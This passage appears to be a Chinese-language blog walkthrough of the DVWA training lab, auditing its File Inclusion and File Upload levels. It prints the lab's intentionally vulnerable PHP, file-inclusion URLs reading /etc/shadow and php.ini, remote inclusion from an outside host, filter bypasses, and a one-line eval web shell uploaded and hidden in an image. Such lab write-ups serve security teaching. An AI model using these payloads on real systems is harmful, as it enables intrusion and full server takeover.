class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">        // Check Anti-CSRF token </span><br><span class="line">        checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    </span><br><span class="line">        // Get input </span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">'password_current'</span> ]; </span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Sanitise current password input </span><br><span class="line">        <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> ); </span><br><span class="line">        <span class="variable">$pass_curr</span> = mysql_real_escape_string( <span class="variable">$pass_curr</span> ); </span><br><span class="line">        <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> ); </span><br><span class="line">    </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">':password'</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">    </span><br><span class="line">        // Do both new passwords match and does the current password match the user? </span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // It does! </span><br><span class="line">            <span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> ); </span><br><span class="line">            <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> ); </span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> ); </span><br><span class="line">    </span><br><span class="line">            // Update database with new password </span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">':password'</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">    </span><br><span class="line">            // Feedback <span class="keyword">for</span> the user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Issue with passwords matching </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    // Generate Anti-CSRF token </span><br><span class="line">    generateSessionToken(); </span><br><span class="line">    </span><br><span class="line">    ?&gt; </span><br><span class="line">```    </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line">利用PDO技术防御SQL注入，使用token以及输入原始密码防护CSRF,攻击者不知道密码，无论如何都无法进行CSRF攻击</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## File Inclusion</span></span><br><span class="line"></span><br><span class="line">File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了</span><br><span class="line">![](fileinclue01.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Low</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;php</span><br><span class="line">    //Thepagewewishtodisplay</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line">    &gt;</span><br></pre></td></tr></table></figure><h4 id="审计-9"><a href="#审计-9" class="headerlink" title="审计"></a>审计</h4><p>page参数没有做任何的过滤跟检查,接受什么参数就包含相应的文件，并将结果返回。</p><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>本地文件包含<blockquote><p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p></blockquote></li></ul><p><img src="fileinclude02.png" alt=""></p><p>显示报错，并且从报错可以知道服务器文件的绝对路径C:\xampp\htdocs\</p><p>因此我们再构造url</p><blockquote><p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=C:/xampp/htdocs/DVWA/php.ini" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=C:/xampp/htdocs/DVWA/php.ini</a></p></blockquote><p>成功读取了服务器的php.ini文件</p><p><img src="fileinclusion03.png" alt=""></p><ul><li>远程文件包含</li></ul><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>我们在攻击者服务器上上传一个phpinfo.txt,代码简单如下所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>然后访问：</p><blockquote><p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=http://5kcrm.com/phpinfo.txt" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=http://5kcrm.com/phpinfo.txt</a></p></blockquote><p>同样也可以执行成功</p><h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    &lt;php</span><br><span class="line">    </span><br><span class="line">    //Thepagewewishtodisplay</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line">    </span><br><span class="line">    //Inputvalidation</span><br><span class="line">    <span class="variable">$file</span>=str_replace(array(<span class="string">"http://"</span>,<span class="string">"https://"</span>),<span class="string">""</span>,<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span>=str_replace(array(<span class="string">"../"</span>,<span class="string">"..\""</span>),<span class="string">""</span>,<span class="variable">$file</span>);、</span><br><span class="line">```    </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line">增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line"></span><br><span class="line">str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</span><br><span class="line">比如Low级别的代码:</span><br><span class="line"></span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=http://5kcrm.com/phpinfo.txt</span><br><span class="line"></span><br><span class="line">我们可以写成这样绕过</span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=hthttp://tp://5kcrm.com/phpinfo.txt</span><br><span class="line"></span><br><span class="line">同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</span><br><span class="line"></span><br><span class="line">- 本地文件包含</span><br><span class="line"></span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</span><br><span class="line"></span><br><span class="line">&gt;&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=C:/xampp/htdocs/dvwa/php.ini</span><br><span class="line"></span><br><span class="line">- 远程文件</span><br><span class="line"></span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=hthttp://tp://5kcrm.com/phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">### High</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;php</span><br><span class="line">    </span><br><span class="line">    //Thepagewewishtodisplay</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line">    </span><br><span class="line">    //Inputvalidation</span><br><span class="line">    <span class="keyword">if</span>(!fnmatch(<span class="string">"file*"</span>,<span class="variable">$file</span>)&amp;&amp;<span class="variable">$file</span>!=<span class="string">"include.php"</span>)&#123;</span><br><span class="line">       //Thisisn<span class="string">'tthepagewewant!</span></span><br><span class="line"><span class="string">    echo"ERROR:Filenotfound!";</span></span><br><span class="line"><span class="string">    exit;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;</span></span><br></pre></td></tr></table></figure><h4 id="审计-10"><a href="#审计-10" class="headerlink" title="审计"></a>审计</h4><p>High级别的代码规定只能包含file开头的文件，可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议。</p><h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><blockquote><p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p></blockquote><h3 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">//Thepagewewishtodisplay</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line">//Onlyallowinclude.phporfile&#123;1..3&#125;.php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>!=<span class="string">"include.php"</span>&amp;&amp;<span class="variable">$file</span>!=<span class="string">"file1.php"</span>&amp;&amp;<span class="variable">$file</span>!=<span class="string">"file2.php"</span>&amp;&amp;<span class="variable">$file</span>!=<span class="string">"file3.php"</span>)&#123;</span><br><span class="line">//Thisisn<span class="string">'tthepagewewant!</span></span><br><span class="line"><span class="string">echo"ERROR:Filenotfound!";</span></span><br><span class="line"><span class="string">exit;</span></span><br></pre></td></tr></table></figure><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>使用了白名单机制进行防护，age参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。<br>无懈可击。</p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p><p><img src="fileUpload01.png" alt=""></p><h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder? </span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">        // No </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Yes! </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-11"><a href="#审计-11" class="headerlink" title="审计"></a>审计</h4><p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><h4 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。这里三个条件全都满足。</p><p>这时候我们就可以使用一句话木马以及中国菜刀混合使用</p><ul><li>上传文件hack.php</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'muma'</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上传成功，并且返回了上传的路径<br><img src="fileupload02.png" alt=""></p><p>打开中国菜刀，右键添加我们上传文件的所在路径,参数名（一句话木马口令）为muma</p><p><img src="fileupload04.png" alt=""></p><p>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。</p><p>可以下载、修改服务器的所有文件。</p><p><img src="fileupload05.png" alt=""><br>感觉这漏洞有点惨，直接整站被黑了。</p><h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">        // Where are we going to be writing to? </span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">        <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line">    </span><br><span class="line">        // File information </span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Is it an image? </span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">"image/jpeg"</span> || <span class="variable">$uploaded_type</span> == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">            ( <span class="variable">$uploaded_size</span> &lt; 100000 ) ) &#123; </span><br><span class="line">    </span><br><span class="line">            // Can we move the file to the upload folder? </span><br><span class="line">            <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">                // No </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                // Yes! </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Invalid file </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ?&gt; </span><br><span class="line">```    </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line"></span><br><span class="line">Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line"></span><br><span class="line">- 文件上传+文件包含</span><br><span class="line">因为对格式有限制，我们就把hack.php改为hack.png，像low级别的漏洞利用一样，虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息。</span><br><span class="line">![](fileupload06.png)</span><br><span class="line"></span><br><span class="line">这是因为服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</span><br><span class="line"></span><br><span class="line">那么现在问题是如何让服务器将我们这个图片解析为php文件呢，还记得文件包含漏洞吗，在php中，include中的文件都会把它当成php文件执行</span><br><span class="line">所以，我们借助上传文件漏洞，在菜刀中添加一下地址，</span><br><span class="line"></span><br><span class="line">http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=hthttp://tp://dvwa.com/DVWA/hackable/uploads/hack.png</span><br><span class="line"></span><br><span class="line">- 抓包修改文件类型</span><br><span class="line">直接使用burp对上传过程进行抓包，然后将filename改成php格式</span><br><span class="line">![](fileupload08.png)</span><br><span class="line">然后使用菜刀获取webshell权限</span><br><span class="line"></span><br><span class="line"><span class="comment">### High</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">        // Where are we going to be writing to? </span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">        <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line">    </span><br><span class="line">        // File information </span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> ) + 1); </span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Is it an image? </span><br><span class="line">        <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpg"</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpeg"</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">            ( <span class="variable">$uploaded_size</span> &lt; 100000 ) &amp;&amp; </span><br><span class="line">            getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123; </span><br><span class="line">    </span><br><span class="line">            // Can we move the file to the upload folder? </span><br><span class="line">            <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">                // No </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                // Yes! </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Invalid file </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-12"><a href="#审计-12" class="headerlink" title="审计"></a>审计</h4><p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。<br>不像上一个级别代码一样，只判断上传文件的类型，因此不能像上述直接抓包修改文件名字</p><h4 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>将一句木马存储在图片文件当中，做法是使用copy命令将一句话木马php文件与图片文件合并<br><img src="fileupload10.png" alt=""></p><p>然后上菜刀，右键添加</p><blockquote><p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hajk.jpg" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hajk.jpg</a></p></blockquote><h3 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> ) + 